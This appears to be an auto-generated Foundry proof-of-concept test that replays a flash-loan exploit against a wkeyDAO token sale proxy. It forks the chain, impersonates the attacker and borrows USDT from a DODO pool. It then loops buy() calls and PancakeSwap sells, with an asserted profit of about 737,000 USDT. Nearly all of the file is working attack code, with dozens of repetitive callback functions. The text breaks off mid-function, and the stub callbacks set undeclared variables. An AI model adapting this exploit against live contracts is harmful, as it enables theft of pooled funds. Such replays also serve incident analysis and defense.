
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.DODOFlashloan;
    uint256 constant FORK_BLOCK = 47469059;
    uint256 constant TX_TIMESTAMP = 1741988830;
    uint256 constant TX_BLOCK_NUMBER = 47469060;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttackContrac();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttackContrac() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntimeFallb();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        attack;
        return address(0);
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _installRuntimeFallb() internal {

        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 737321043501382964470008);
        _expectProfit(Addresses.DODOFlashloan, attack, Addresses.WKNFT, "WKNFT", 67);
    }
}

contract OurAttack {


    function attack() external payable {
        _runExploitPath();
    }

    function _runExploitPath() internal {
        _replayProtocolCalls();
        _replayProtocolCal2();
    }

    function _replayProtocolCalls() internal {
        IDLP(Addresses.DLP)._BASE_TOKEN_();
    }

    function _replayProtocolCal2() internal {
        {
            bytes memory flashLoanProof =
                hex"000000000000000000000000107f3be24e3761a91322aa4f5f54d9f18981530c00000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000410d586a20a4c00000";
            IDLP(Addresses.DLP).flashLoan(0, 1200000000000000000000, address(this), flashLoanProof);
        }
    }

    function _nftCb() internal {
        replayedCallback2 = true;
    }

    function _nftCb2() internal {
        replayedCallback3 = true;
    }

    function _nftCb3() internal {
        replayedCallback4 = true;
    }

    function _nftCb4() internal {
        replayedCallback5 = true;
    }

    function _nftCb5() internal {
        replayedCallback6 = true;
    }

    function _nftCb6() internal {
        replayedCallback7 = true;
    }

    function _nftCb7() internal {
        replayedCallback8 = true;
    }

    function _nftCb8() internal {
        replayedCallback9 = true;
    }

    function _nftCb9() internal {
        replayedCallback10 = true;
    }

    function _nftCb10() internal {
        replayedCallback11 = true;
    }

    function _nftCb11() internal {
        replayedCallback12 = true;
    }

    function _nftCb12() internal {
        replayedCallback13 = true;
    }

    function _nftCb13() internal {
        replayedCallback14 = true;
    }

    function _nftCb14() internal {
        replayedCallback15 = true;
    }

    function _nftCb15() internal {
        replayedCallback16 = true;
    }

    function _nftCb16() internal {
        replayedCallback17 = true;
    }

    function _nftCb17() internal {
        replayedCallback18 = true;
    }

    function _nftCb18() internal {
        replayedCallback19 = true;
    }

    function _nftCb19() internal {
        replayedCallback20 = true;
    }

    function _nftCb20() internal {
        replayedCallback21 = true;
    }

    function _nftCb21() internal {
        replayedCallback22 = true;
    }

    function _nftCb22() internal {
        replayedCallback23 = true;
    }

    function _nftCb23() internal {
        replayedCallback24 = true;
    }

    function _nftCb24() internal {
        replayedCallback25 = true;
    }

    function _nftCb25() internal {
        replayedCallback26 = true;
    }

    function _nftCb26() internal {
        replayedCallback27 = true;
    }

    function _nftCb27() internal {
        replayedCallback28 = true;
    }

    function _nftCb28() internal {
        replayedCallback29 = true;
    }

    function _nftCb29() internal {
        replayedCallback30 = true;
    }

    function _nftCb30() internal {
        replayedCallback31 = true;
    }

    function _nftCb31() internal {
        replayedCallback32 = true;
    }

    function _nftCb32() internal {
        replayedCallback33 = true;
    }

    function _nftCb33() internal {
        replayedCallback34 = true;
    }

    function _nftCb34() internal {
        replayedCallback35 = true;
    }

    function _nftCb35() internal {
        replayedCallback36 = true;
    }

    function _nftCb36() internal {
        replayedCallback37 = true;
    }

    function _nftCb37() internal {
        replayedCallback38 = true;
    }

    function _nftCb38() internal {
        replayedCallback39 = true;
    }

    function _nftCb39() internal {
        replayedCallback40 = true;
    }

    function _nftCb40() internal {
        replayedCallback41 = true;
    }

    function _nftCb41() internal {
        replayedCallback42 = true;
    }

    function _nftCb42() internal {
        replayedCallback43 = true;
    }

    function _nftCb43() internal {
        replayedCallback44 = true;
    }

    function _nftCb44() internal {
        replayedCallback45 = true;
    }

    function _nftCb45() internal {
        replayedCallback46 = true;
    }

    function _nftCb46() internal {
        replayedCallback47 = true;
    }

    function _nftCb47() internal {
        replayedCallback48 = true;
    }

    function _nftCb48() internal {
        replayedCallback49 = true;
    }

    function _nftCb49() internal {
        replayedCallback50 = true;
    }

    function _nftCb50() internal {
        replayedCallback51 = true;
    }

    function _nftCb51() internal {
        replayedCallback52 = true;
    }

    function _nftCb52() internal {
        replayedCallback53 = true;
    }

    function _nftCb53() internal {
        replayedCallback54 = true;
    }

    function _nftCb54() internal {
        replayedCallback55 = true;
    }

    function _nftCb55() internal {
        replayedCallback56 = true;
    }

    function _nftCb56() internal {
        replayedCallback57 = true;
    }

    function _nftCb57() internal {
        replayedCallback58 = true;
    }

    function _nftCb58() internal {
        replayedCallback59 = true;
    }

    function _nftCb59() internal {
        replayedCallback60 = true;
    }

    function _nftCb60() internal {
        replayedCallback61 = true;
    }

    function _nftCb61() internal {
        replayedCallback62 = true;
    }

    function _nftCb62() internal {
        replayedCallback63 = true;
    }

    function _nftCb63() internal {
        replayedCallback64 = true;
    }

    function _nftCb64() internal {
        replayedCallback65 = true;
    }

    function _nftCb65() internal {
        replayedCallback66 = true;
    }

    function _nftCb66() internal {
        replayedCallback67 = true;
    }

    function _nftCb67() internal {
        replayedCallback68 = true;
    }

    function flashCallback() internal {
        replayedCallback69 = true;
        flashCallback2();
        flashCallback3();
        flashCallback4();
        flashCallback5();
        flashCallback6();
        flashCallback7();
        flashCallback8();
        flashCallback9();
        flashCallback10();
        flashCallback11();
        flashCallback12();
        flashCallback13();
        flashCallback14();
        flashCallback15();
        flashCallback16();
        flashCallback17();
        flashCallback18();
        flashCallback19();
        flashCallback20();
        flashCallback21();
        flashCallback22();
        flashCallback23();
        flashCallback24();
        flashCallback25();
        flashCallback26();
        flashCallback27();
        flashCallback28();
        flashCallback29();
        flashCallback30();
        flashCallback31();
        flashCallback32();
        flashCallback33();
        flashCallback34();
        flashCallback35();
        flashCallback36();
        flashCallback37();
        flashCallback38();
        flashCallback39();
        flashCallback40();
        flashCallback41();
        flashCallback42();
        flashCallback43();
        flashCallback44();
        flashCallback45();
        flashCallback46();
        flashCallback47();
        flashCallback48();
        flashCallback49();
        flashCallback50();
        flashCallback51();
        flashCallback52();
        flashCallback53();
        flashCallback54();
        flashCallback55();
        flashCallback56();
        flashCallback57();
        flashCallback58();
        flashCallback59();
        flashCallback60();
        flashCallback61();
        flashCallback62();
        flashCallback63();
        flashCallback64();
        flashCallback65();
        flashCallback66();
        flashCallback67();
        flashCallback68();
        flashCallback69();
        flashCallback70();
        flashCallback71();
        flashCallback72();
        flashCallback73();
        flashCallback74();
        flashCallback75();
        flashCallback76();
        flashCallback77();
        flashCallback78();
        flashCallback79();
        flashCallback80();
        flashCallback81();
        flashCallback82();
        flashCallback83();
        flashCallback84();
        flashCallback85();
        flashCallback86();
        flashCallback87();
        flashCallback88();
        flashCallback89();
        flashCallback90();
        flashCallback91();
        flashCallback92();
        flashCallback93();
        flashCallback94();
        flashCallback95();
        flashCallback96();
        flashCallback97();
        flashCallback98();
        flashCallback99();
        flashCallback100();
        flashCallback101();
        flashCallback102();
        flashCallback103();
        flashCallback104();
        flashCallback105();
        flashCallback106();
        flashCallback107();
        flashCallback108();
        flashCallback109();
        flashCallback110();
        flashCallback111();
        flashCallback112();
        flashCallback113();
        flashCallback114();
        flashCallback115();
        flashCallback116();
        flashCallback117();
        flashCallback118();
        flashCallback119();
        flashCallback120();
        flashCallback121();
        flashCallback122();
        flashCallback123();
        flashCallback124();
        flashCallback125();
        flashCallback126();
        flashCallback127();
        flashCallback128();
        flashCallback129();
        flashCallback130();
        flashCallback131();
        flashCallback132();
        flashCallback133();
    }

    function flashCallback2() internal {
        IERC20Like(Addresses.USDT)
            .approve(Addresses.TransparentUpgradeableProxy_D51109, 10000000000000000000000000000000);
    }

    function flashCallback3() internal {
        IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, 10000000000000000000000000000000);
    }

    function flashCallback4() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback5() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback6() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback7() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback8() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback9() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback10() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback11() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback12() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback13() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback14() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback15() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback16() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback17() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback18() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback19() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback20() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback21() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback22() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback23() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback24() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback25() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback26() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback27() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback28() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback29() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback30() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback31() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback32() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback33() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback34() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback35() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback36() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback37() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback38() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback39() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback40() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback41() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback42() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback43() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback44() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback45() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback46() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback47() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback48() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback49() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
    }

    function flashCallback50() internal {
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback51() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback52() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
                        _addressArray2(Addresses.wkeyDAO, Addresses.USDT),
                        address(this),
                        89218399213893
                    );
            }
        }
    }

    function flashCallback53() internal {
        ITransparentUpgradeableProxy_D51109(Addresses.TransparentUpgradeableProxy_D51109).buy();
        IERC20Like(Addresses.wkeyDAO).balanceOf(address(this));
    }

    function flashCallback54() internal {
        {
            uint256 swapAmountIn = 230000000000;
            if (swapAmountIn != 0) {
                if (
                    IERC20Like(Addresses.wkeyDAO).allowance(address(this), Addresses.PancakeRouter)
                        < swapAmountIn
                ) {
                    IERC20Like(Addresses.wkeyDAO).approve(Addresses.PancakeRouter, type(uint256).max);
                }
                IPancakeRouter(Addresses.PancakeRouter)
                    .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                        swapAmountIn,
                        1,
